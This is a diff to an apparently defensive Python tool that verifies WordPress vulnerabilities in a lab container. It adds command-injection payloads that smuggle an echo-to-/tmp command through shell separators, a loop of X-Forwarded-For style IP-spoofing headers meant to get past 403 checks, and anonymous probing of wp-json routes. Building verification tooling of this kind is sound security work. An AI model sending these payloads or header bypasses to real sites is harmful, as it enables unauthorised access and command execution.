@@ -6085,6 +6085,43 @@ def verify_wordpress_command_injection(
                     break
             res.evidence["blind_timing_intento"] = sleep_evidence
 
+        # OOB /tmp file fallback: if neither arithmetic echo nor timing worked, write a unique
+        # marker to /tmp and read it back via wp-cli eval (wp-cli runs in the same container).
+        # Covers cases where shell output is never reflected and sleep is absorbed by the app.
+        if not found:
+            _oob_marker = secrets.token_hex(8)
+            _oob_path = f"/tmp/binoracle_oob_{_oob_marker}.txt"
+            _oob_payloads = [
+                f"; echo {_oob_marker} > {_oob_path}",
+                f"| echo {_oob_marker} > {_oob_path}",
+                f"&& echo {_oob_marker} > {_oob_path}",
+                f"`echo {_oob_marker} > {_oob_path}`",
+                f"$(echo {_oob_marker} > {_oob_path})",
+                f"\necho {_oob_marker} > {_oob_path}\n",
+            ]
+            for _oob_pl in _oob_payloads:
+                payload = dict(base_params)
+                payload[cmd_param] = _oob_pl
+                try:
+                    boot.sub_sess.request(m, boot.base_url + endpoint,
+                                          data=payload if m != "GET" else None,
+                                          params=payload if m == "GET" else None, timeout=20)
+                except Exception:
+                    continue
+                _r_oob = lab.wp_cli("eval",
+                                    f"echo file_exists('{_oob_path}') ? file_get_contents('{_oob_path}') : '';",
+                                    timeout=10)
+                _oob_content = (_r_oob.stdout or "").strip() if _r_oob else ""
+                if _oob_marker in _oob_content:
+                    found = True
+                    res.evidence["payload_ganador"] = _oob_pl
+                    res.evidence["tecnica"] = "oob-file"
+                    res.evidence["cmdi_oob_file"] = {
+                        "path": _oob_path, "marker": _oob_marker, "confirmed": True}
+                    step(f"VERIFICADO (OOB file): marker {_oob_marker!r} encontrado en "
+                         f"{_oob_path} via wp-cli eval — shell remoto escribio el fichero")
+                    break
+
         if found:
             res.verified = True
             res.ok = True
@@ -6094,6 +6131,11 @@ def verify_wordpress_command_injection(
                               f"respuesta de forma consistente con 'sleep {sleep_n}' ejecutandose "
                               f"de verdad en un shell remoto -- no hay salida visible, pero el "
                               f"retraso medido es la prueba")
+            elif res.evidence.get("tecnica") == "oob-file":
+                res.detail = (f"COMMAND INJECTION confirmada (OOB file): payload "
+                              f"{cmd_param}={res.evidence['payload_ganador']!r} escribio marker "
+                              f"unico en {res.evidence.get('cmdi_oob_file', {}).get('path', '/tmp')} "
+                              f"verificado via wp-cli eval — el shell remoto ejecuto el comando")
             else:
                 res.detail = (f"COMMAND INJECTION confirmada: la peticion con {cmd_param}="
                               f"{res.evidence['payload_ganador']!r} hizo que el servidor "
@@ -13098,6 +13140,46 @@ def verify_wordpress_missing_auth_probe(
                 except Exception:
                     pass
 
+        # IP header bypass: when endpoint returns 403, retry with common IP-spoofing headers.
+        # Some WP REST endpoints block by IP/origin rather than by capability — sending
+        # X-Forwarded-For: 127.0.0.1 bypasses the check if the middleware trusts this header.
+        if _rejected and status == 403 and not res.verified and boot is not None:
+            _IP_BYPASS_HDRS = [
+                {"X-Forwarded-For": "127.0.0.1"},
+                {"X-Real-IP": "127.0.0.1"},
+                {"X-Original-IP": "127.0.0.1"},
+                {"X-Originating-IP": "127.0.0.1"},
+                {"Client-IP": "127.0.0.1"},
+                {"X-Remote-Addr": "127.0.0.1"},
+                {"Forwarded": "for=127.0.0.1"},
+            ]
+            for _ih in _IP_BYPASS_HDRS:
+                try:
+                    _ih_sess = _make_session()
+                    _ih_sess.headers.update(_ih)
+                    _ih_r = _ih_sess.request(
+                        m, boot.base_url + endpoint,
+                        json=params_dict if (m not in ("GET", "HEAD") and json_body) else None,
+                        data=params_dict if (m not in ("GET", "HEAD") and not json_body) else None,
+                        params=params_dict if m == "GET" else None,
+                        timeout=20, allow_redirects=True)
+                    _ih_st = _ih_r.status_code
+                    _ih_b = (_ih_r.text or "")[:2000]
+                    _ih_low = _ih_b.lower()
+                    _ih_rejected = (_ih_st in (401, 403) or
+                                    any(s in _ih_low for s in _AUTH_REJECT_SIGNALS) or
+                                    _ih_b.strip() in ("", "0", "-1", "null"))
+                    if not _ih_rejected and _ih_st < 400 and len(_ih_b.strip()) > 10:
+                        hdr_name = list(_ih.keys())[0]
+                        step(f"IP header bypass: {hdr_name}: 127.0.0.1 → HTTP {_ih_st} ({len(_ih_b)}B)")
+                        res.evidence["ip_header_bypass"] = {
+                            "header": hdr_name, "status": _ih_st, "body_snippet": _ih_b[:200]}
+                        status, body, body_low = _ih_st, _ih_b, _ih_low
+                        _rejected = False
+                        break
+                except Exception:
+                    pass
+
         if _rejected:
             res.ok = True
             res.detail = (f"el endpoint responde HTTP {status} o devuelve senal de rechazo "
@@ -13479,6 +13561,34 @@ def verify_wordpress_missing_auth_probe(
                              f"encontradas — disponibles para siguiente intento")
             except Exception:
                 pass
+
+        # Mass-probe all discovered wp-json routes as anonymous.
+        # When the main endpoint was 404 and WP REST discovery found routes, probe each one
+        # as anon — the vulnerable route may be registered under a different path than the LLM guessed.
+        _disc_routes = (res.evidence.get("wp_rest_discovery") or {}).get("routes_sample") or []
+        if _disc_routes and not res.verified and boot is not None:
+            step(f"mass-probe: probando {min(len(_disc_routes), 20)} rutas wp-json como anonimo...")
+            for _rt in _disc_routes[:20]:
+                if _rt == endpoint:
+                    continue
+                try:
+                    _rr = anon_sess.get(boot.base_url + _rt, timeout=10, allow_redirects=True)
+                    _rs = _rr.status_code
+                    _rb = (_rr.text or "")[:500]
+                    _rbl = _rb.lower()
+                    _rt_rejected = (_rs in (401, 403) or
+                                    any(s in _rbl for s in _AUTH_REJECT_SIGNALS) or
+                                    _rb.strip() in ("", "0", "-1", "null", "[]", "{}"))
+                    if not _rt_rejected and _rs == 200 and len(_rb.strip()) > 50:
+                        step(f"mass-probe: ruta accesible sin auth: {_rt} → HTTP {_rs} ({len(_rb)}B)")
+                        res.evidence["wp_json_anon_accessible"] = {
+                            "route": _rt, "status": _rs, "body_snippet": _rb[:200]}
+                        status, body, body_low, endpoint = _rs, _rb, _rbl, _rt
+                        _rejected = False
+                        res.ok = True
+                        break
+                except Exception:
+                    pass
 
         return res
     except subprocess.TimeoutExpired as e:
